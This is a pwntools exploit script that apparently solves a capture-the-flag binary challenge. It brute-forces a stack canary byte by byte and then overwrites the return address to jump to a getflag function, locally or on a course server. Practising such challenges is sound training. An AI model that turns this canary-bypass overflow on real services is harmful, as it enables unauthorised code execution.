#!/usr/bin/env python3
from pwn import *

# Definitions
e = context.binary = ELF('./chall4',checksec=False)
context.terminal = ['terminator', '-e']

if args.REMOTE:
    io = remote('cusecurity.cs.colorado.edu', 2226)
else:
    io = process(e.path)

# Exploit
def pwn():

    # Canary bruteforce
    _canary = b''

    io.recvline()
    while len(_canary) < 8:
        for i in range(255):

            payload = 40*b'A'+_canary+bytes([i])
            io.sendline(str(len(payload)))
            io.recvline()
            io.send(payload)

            if b'stack smashing' not in io.recvline():
                _canary += bytes([i])
                print(f'[.] Bruteforcing: {_canary}', end='\r')

                if len(_canary) >= 8:
                    break

            io.recvline()
    canary = u64(_canary)
    log.success('Canary: ' + hex(canary))

    # Smash the stack
    getflag = 0x401675

    payload = 40*b'A'
    payload += p64(canary)
    payload += 8*b'B'
    payload += p64(getflag)

    io.recvline()
    io.sendline(str(len(payload)))
    io.recvline()
    io.send(payload)

pwn()
io.interactive()